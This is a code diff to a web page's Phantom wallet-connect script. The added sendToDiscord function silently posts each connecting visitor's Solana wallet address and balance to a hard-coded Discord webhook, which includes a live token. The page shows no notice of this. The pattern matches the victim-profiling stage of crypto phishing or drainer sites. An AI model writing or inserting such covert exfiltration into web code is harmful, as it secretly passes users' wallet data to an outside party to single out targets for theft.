@@ -1,7 +1,6 @@
 var wallet;
 
 function connectWallet() {
-  // Silent redirect if Phantom not found
   if (!window.solana || !window.solana.isPhantom) {
     window.location.href = "https://phantom.app/";
     return;
@@ -11,16 +10,49 @@ function connectWallet() {
     try {
       wallet = await window.solana.connect();
       document.getElementById("connect_button").innerText = "Connected ✅";
+
+      const walletAddress = wallet.publicKey.toString();
+      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+      const balanceLamports = await connection.getBalance(wallet.publicKey);
+      const solBalance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+
       document.getElementById("status_p").innerText =
-        "Wallet Address: " + ellipsizeAddress(wallet.publicKey.toString());
+        "Wallet: " + ellipsizeAddress(walletAddress) + " | Balance: " + solBalance.toFixed(4) + " SOL";
+
+      sendToDiscord(walletAddress, solBalance);
     } catch (err) {
-      console.log("Connection failed:", err);
       document.getElementById("status_p").innerText = "❌ Connection failed!";
     }
   })();
+}
 
-  window.solana.on("connect", () => {
-    document.getElementById("connect_button").innerText = "Connected ✅";
+function sendToDiscord(address, balance) {
+  const webhookUrl = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";
+
+  const embed = {
+    embeds: [
+      {
+        title: "🟣 Phantom Wallet Connected",
+        color: 0x8000ff,
+        fields: [
+          {
+            name: "Wallet Address",
+            value: `\`${address}\``
+          },
+          {
+            name: "Balance",
+            value: `\`${balance.toFixed(4)} SOL\``
+          }
+        ],
+        timestamp: new Date().toISOString()
+      }
+    ]
+  };
+
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(embed)
   });
 }
 
